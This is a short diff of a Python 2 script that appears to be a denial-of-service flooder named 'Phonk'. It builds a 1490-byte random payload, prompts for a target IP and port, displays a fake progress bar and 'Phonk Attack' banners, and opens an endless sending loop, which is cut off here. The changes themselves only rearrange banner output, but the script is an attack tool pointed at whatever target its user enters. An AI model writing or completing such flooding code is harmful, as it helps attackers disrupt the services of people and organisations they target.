@@ -20,23 +20,25 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet Phonk <3")
+os.system("figlet Phonk")
 
+print "Phonk"
+print "Phonk"
 print "Phonk"
 
 ip = raw_input("IP Target : ")
 port = input("Port : ")
-
-os.system("clear")
-
-print("\033[93m")
-os.system("figlet Phonk Attack")
 
 print ("\033[92m")
 print "[     ] 0% "
 time.sleep(5)
 print "[     ] 100%"
 time.sleep(3)
+
+os.system("clear")
+print("\033[93m")
+os.system("figlet Phonk Attack")
+print "Phonk"
 
 sent = 0
 while True:
